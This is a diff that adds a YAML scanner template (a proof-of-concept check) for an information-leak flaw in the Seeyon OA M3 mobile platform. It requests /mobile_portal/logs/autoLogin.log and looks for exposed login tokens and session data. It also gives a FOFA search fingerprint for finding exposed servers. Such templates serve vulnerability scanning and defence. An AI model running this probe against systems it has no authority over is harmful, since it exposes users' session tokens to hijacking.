@@ -1,0 +1,15 @@
+id: poc-yaml-seeyon-autologin-log-session-sensitive-info-leak
+info:
+  name: 致远OA移动智能办公平台 autoLogin.log Session敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远OA移动智能办公平台
+  fofa: title="M3-Server"
+requests:
+- method: GET
+  path: /mobile_portal/logs/autoLogin.log
+  expression: "status_code == 200 && \ncontains(body,\"loginToken:\") &&\ncontains(body,\"\
+    User Session\") &&\ncontains(body,\"AUTOLOGIN\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
